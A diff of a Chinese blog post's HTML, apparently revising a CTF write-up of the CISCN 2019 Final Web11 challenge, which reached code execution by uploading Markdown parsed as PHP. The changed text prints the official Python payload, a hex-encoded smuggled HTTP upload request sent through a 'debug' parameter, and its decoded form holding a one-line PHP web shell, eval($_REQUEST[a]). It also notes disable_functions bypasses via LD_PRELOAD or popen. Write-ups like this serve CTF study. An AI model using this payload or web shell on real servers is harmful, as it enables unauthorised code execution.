@@ -88,7 +88,7 @@
     <main class="main">
         <article class="post">
             <h1>
-                <a class="title" href="/2019/07/29/CISCN 2019 Final Web11题解/"> 
+                <a class="title" href="/2019/07/29/CISCN 2019 Final Web11复盘/"> 
                     CISCN 2019 Final Web11题解 
                 </a>
             </h1>
@@ -107,11 +107,11 @@
                     <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
             </div>
 <div class="toc">
-  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#CISCN-2019-Final-Web11题解"><span class="toc-list-text">CISCN 2019 Final Web11题解</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#简述"><span class="toc-list-text">简述</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#思路"><span class="toc-list-text">思路</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#解题步骤"><span class="toc-list-text">解题步骤</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#后续"><span class="toc-list-text">后续</span></a></li></ol></li></ol>
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#CISCN-2019-Final-Web11复盘"><span class="toc-list-text">CISCN 2019 Final Web11复盘</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#简述"><span class="toc-list-text">简述</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#思路"><span class="toc-list-text">思路</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#解题步骤"><span class="toc-list-text">解题步骤</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#后续"><span class="toc-list-text">后续</span></a></li></ol></li></ol>
 </div>
             <div class="content">
-                <h1 id="CISCN-2019-Final-Web11题解"><a href="#CISCN-2019-Final-Web11题解" class="headerlink" title="CISCN 2019 Final Web11题解"></a>CISCN 2019 Final Web11题解</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p>
-<p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：</p>
+                <h1 id="CISCN-2019-Final-Web11复盘"><a href="#CISCN-2019-Final-Web11复盘" class="headerlink" title="CISCN 2019 Final Web11复盘"></a>CISCN 2019 Final Web11复盘</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p>
+<p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p>
 <h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p>
 <p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p>
 <pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p>
@@ -127,8 +127,13 @@
 <p>官方payload:</p>
 <pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)
 data=data.decode(&#39;hex&#39;)
-requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>对data进行decode，值如下</p>
-<pre><code>POST /upload.php HTTP/1.1
+requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>这样不难理解判断的核心即是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p>
+<p>在payload中的形式，相当于传递了两个http包，拼接后如下</p>
+<pre><code>POST whatever HTTP/1.1
+Host: localhost
+Connection: Keep-Alive
+
+POST /upload.php HTTP/1.1
 Host: 127.0.0.1:8080
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -140,17 +145,16 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 
 -----------------------------6693638881479522630623693797
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;logout.php&quot;
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell&quot;
 Content-Type: text/php
 
 &lt;?php 
 eval($_REQUEST[a]);
 
------------------------------6693638881479522630623693797--</code></pre><p>这样不难理解判断的核心就是是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p>
-<p>但是还有一点不理解的是为什么先进行了一次本地请求？按照我的理解是path只经过一次传参，是不可能请求两次的。后来询问出题的师傅说，对debug参数是可以进行两次http请求的，而第一个发送sadfas是为了保持http的连接不被中断。</p>
-<p>data则是让server帮我们请求Upload并上传md文件</p>
+-----------------------------6693638881479522630623693797--</code></pre><p>此时就可以把两个http包带入之前的path，构造一个完整的http包请求。而服务端在发送http请求时，会对请求包逐一发送。即先请求了<code>whatever</code>，建立http连接，connection:keep-alive 保持http的连接不被中断。</p>
+<p>第二次请求data.decode(‘hex’)，让server帮我们请求Upload并上传md文件从而getshell</p>
 <h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p>
-<p>逆向功底太差了…有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>
+<p>逆向功底太差了，有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>
 
             </div>
           
@@ -162,7 +166,7 @@ eval($_REQUEST[a]);
                 </div>
                 <div class="link">
                     <a>Link:</a>
-                    <a class="permalink" href="https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11题解/">https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11题解/</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11复盘/">https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11复盘/</a>
                 </div>
                 <div class="license">
                     <a>Statement:</a>
@@ -195,14 +199,10 @@ eval($_REQUEST[a]);
 
 <div class="more">
 
-    <div class="prev">
-   <a href="/2025/01/01/CTF比赛常用-持续更新/">  置顶-持续更新中的CTF备忘录</a>
-    </div>
-
 <div></div>
 
     <div class="next">
-    <a href="/2019/07/13/从一次漏洞挖掘入门ldap注入/"> 记一次LDAP注入漏洞入门到挖掘实例 </a>
+    <a href="/2019/07/02/前端全局变量劫持/"> 前端全局变量劫持 </a>
     </div>
     
 </div>
